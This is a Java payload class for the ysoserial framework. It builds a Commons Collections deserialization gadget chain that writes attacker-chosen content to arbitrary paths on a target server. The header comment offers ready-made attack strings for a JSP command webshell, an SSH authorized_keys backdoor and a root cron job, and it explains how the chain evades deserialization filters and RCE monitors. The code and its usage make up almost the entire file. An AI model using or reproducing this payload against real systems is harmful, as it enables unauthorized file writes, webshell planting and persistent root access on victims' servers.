package ysoserial.payloads;

import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.bidimap.DualHashBidiMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Arbitrary file write via FileOutputStream — webshell drop without RCE.

	Gadget chain:
		ObjectInputStream.readObject()
			DualHashBidiMap.readObject()
				HashMap.put(key, value)
					key.hashCode()
						TiedMapEntry.hashCode()
							TiedMapEntry.getValue()
								LazyMap.get()
									ChainedTransformer.transform()
										ConstantTransformer → FileOutputStream.class
										InvokerTransformer → new FileOutputStream(path)
										InvokerTransformer → fos.write(bytes)
										InvokerTransformer → fos.close()

	Why this matters:
		- Write arbitrary content to arbitrary path on target filesystem
		- Drop JSP/PHP webshell without triggering RCE/JNDI monitors
		- Overwrite configuration files (web.xml, application.properties)
		- Create cron jobs / scheduled tasks
		- FileOutputStream is JDK core — never in deser filters

	Attack scenarios:
		- JSP webshell: "/opt/tomcat/webapps/ROOT/cmd.jsp:<%Runtime.getRuntime().exec(request.getParameter(\"c\"));%>"
		- SSH key: "/root/.ssh/authorized_keys:ssh-rsa AAAA..."
		- Crontab: "/etc/cron.d/backdoor:* * * * * root /tmp/shell"

	Filter evasion:
		1. DualHashBidiMap — not in any known filter
		2. FileOutputStream — JDK core class, never blocked
		3. No Runtime.exec, no JNDI, no TemplatesImpl
		4. Impact is file write, not direct code execution

	Usage: payload arg = "path:content"
		e.g. "/tmp/pwned.txt:owned"
		     "/opt/tomcat/webapps/ROOT/shell.jsp:<% out.println(Runtime.getRuntime().exec(request.getParameter(\"c\"))); %>"

	Requires:
		commons-collections 3.1+
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.DMBS335 })
public class CommonsCollectionsFileWrite extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String pathAndContent) throws Exception {

		// Parse "path:content" format
		int colonIdx = pathAndContent.indexOf(':');
		if (colonIdx < 0) {
			throw new IllegalArgumentException("Format: path:content (e.g. /tmp/test.txt:hello)");
		}
		String filePath = pathAndContent.substring(0, colonIdx);
		String content = pathAndContent.substring(colonIdx + 1);
		byte[] contentBytes = content.getBytes("UTF-8");

		// Inert transformer during setup
		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

		// Chain:
		// 1. FileOutputStream.class
		// 2. getConstructor(String.class)
		// 3. newInstance(filePath)  → new FileOutputStream(filePath)
		// 4. write(contentBytes)
		// 5. close()
		// But ChainedTransformer passes output of each step to the next,
		// so we need: construct FOS, write, close in sequence.
		//
		// Step 1: FileOutputStream.class → getConstructor → newInstance → FOS object
		// Step 2: FOS.write(bytes) → returns void (null)
		// Problem: after write() returns null, close() has no target.
		// Solution: use a nested chain that constructs, writes, and closes.

		// Actually, simpler approach: construct + write in one InvokerTransformer chain
		// InvokerTransformer passes the result forward. write() returns void.
		// We can't chain write→close because write returns null.

		// Alternative: Use two separate chains? No — ChainedTransformer is linear.
		// Best approach: construct FOS, write bytes. FOS will flush on GC/finalize.
		// close() is nice but not required for small writes — OS flushes on process exit.
		// For robustness, use try-with-resources... but we're in a transformer chain.

		// Simplest working approach:
		// ConstantTransformer(FileOutputStream.class)
		// InvokerTransformer("getConstructor", {Class[].class}, {new Class[]{String.class}})
		// InvokerTransformer("newInstance", {Object[].class}, {new Object[]{filePath}})
		// InvokerTransformer("write", {byte[].class}, {contentBytes})
		// ConstantTransformer(1) — terminal, ignore void return

		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(java.io.FileOutputStream.class),
			new InvokerTransformer("getConstructor", new Class[] {
				Class[].class }, new Object[] {
				new Class[] { String.class } }),
			new InvokerTransformer("newInstance", new Class[] {
				Object[].class }, new Object[] {
				new Object[] { filePath } }),
			new InvokerTransformer("write", new Class[] {
				byte[].class }, new Object[] {
				contentBytes }),
			new ConstantTransformer(1) };

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		DualHashBidiMap bidi = new DualHashBidiMap();
		bidi.put(entry, "bar");

		innerMap.remove("foo");

		// Arm
		Reflections.setFieldValue(transformerChain, "iTransformers", realTransformers);

		return bidi;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollectionsFileWrite.class, args);
	}
}
